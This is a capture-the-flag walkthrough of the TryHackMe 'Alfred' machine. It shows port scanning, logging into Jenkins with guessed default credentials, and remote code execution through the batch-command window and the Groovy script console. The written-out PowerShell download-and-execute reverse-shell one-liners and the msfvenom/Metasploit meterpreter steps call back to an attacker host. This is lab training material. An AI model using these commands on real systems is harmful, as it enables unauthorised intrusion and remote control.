# Alfred

| [![Jenkins](../../_static/images/jenkins.png)](https://tryhackme.com/room/alfred) |
|:--:|
| [https://tryhackme.com/room/alfred](https://tryhackme.com/room/alfred) |

## Inititial access

### Scanning

First run a simple port scan (without Ping)

	nmap -Pn -p- <IP address target machine> -oN portscan
	
Three open ports: Two http (websites?) on port 80 and 8080, and a Remote Desktop service on port 3389.

Run an all scan on the three open ports:

	nmap -Pn -T4 -A -p80,3389,8080 <IP address target machine> -oN servicescan
	
A version for Microsoft IIS, a possible `robots.txt` on port 8080 and something called Jetty.

### Exploring

Browse to the `IP address target machine>:80` and `IP address target machine:8080` website. The first, on port 80, 
shows a silly image and message with nothing else to click or navigate to. The second shows a Jenkins login page.

Maybe default credentials are used for Jenkin and then were not changed? Researching that, the default username is 
`admin` but the password gets automatically filled, dependent on system. And then maybe changed to something more 
easily memorised?

Doing some password guessing manually, I found `admin:admin`. If that had not worked I could have tried intercepting 
a login request with Burpsuite and using Intruder to use a password list against the password field. But, as it is,
I'm already in. 

### Remote code execution

The Jenkins documentation gives me two possible ways of Remote Code Execution:

1. Click "Project" to get into the prebuilt project, then click  "Configure" on the left. Scrolling down, there is a window that allows for executing Windows batch commands.
2. Jenkins also comes with a "Script Console" administrative tool, which allows authenticated users to run scripts using Apache [Groovy](http://www.groovy-lang.org/), a Java-syntax-compatible object-oriented programming language for the Java platform. On the mainpage, go to Project Management, scroll down below the warnings, and click [script console](https://www.jenkins.io/doc/book/managing/script-console/) from the list.

A PowerShell command to execute a reverse shell might work. "Nishang" contains a lot of reverse shell payloads and more.

If on Kali, copy `Invoke-PowershellTcp.ps1` from `/usr/share/nishang/Shells`. If not on Kali, 
[download Invoke-PowershellTcp.ps1 from Gihub](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1).

I decided not to copy and just host the entire Nishang Shells directory, by starting a server in 
`/usr/share/nishang/Shells`:

	python3 -m http.server 80

Option 1: Execute windows batch command window

Test with:

	whoami

```text
powershell iex (New-Object Net.WebClient).DownloadString(‘http://<IP address attack machine>:<http-server port>/Invoke-PowerShellTcp.ps1’);Invoke-PowerShellTcp -Reverse -IPAddress <IP address attack machine> -Port <netcat listener port>
```

Option 2: Script console

Testing remote command execution through the execute function, using "print" to display the output of the command:

	print "whoami".execute().text

In the script console:

```text
print "powershell IEX(New-Object Net.WebClient).downloadString('http://<IP address attack machine>:<http-server port>/Invoke-PowershellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <IP address attack machine> -Port <netcat listener port>".execute().text
```
Get the flag:

	PS  C:\Users\bruce\Desktop> cat users.txt

## Switching shells

Generate payload:

	msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<IP address attack machine> LPORT=<Listen port on attack machine> -f exe -o shell.exe


Set up a Python web server to host the reverse shell:

	# python3 -m http.server 8080

Download the shell.exe into the Target machine using Jenkins:

	PS  C:\Users\bruce\Desktop> powershell "(New-Object System.Net.WebClient).Downloadfile('http://[ATTACKER IP]:8888/shell.exe','shell.exe')"
	
	
In a new terminal, start Metasploit, select the multi handler module, set the payload type, LHOST and LPORT options to match the payload shell, and run the listener:

	# msfconsole -q
	msf6 > use exploit/multi/handler 
	msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp 
	msf6 exploit(multi/handler) > set LHOST <IP address attack machine>
	msf6 exploit(multi/handler) > set LPORT <Listen port on attack machine>
	msf6 exploit(multi/handler) > run
	
In the powershell terminal, executing the reverse shell using the Powershell `Start-Process` cmdlet:
	
	PS  C:\Users\bruce\Desktop> Start-Process "shell.exe"

## Privilege escalation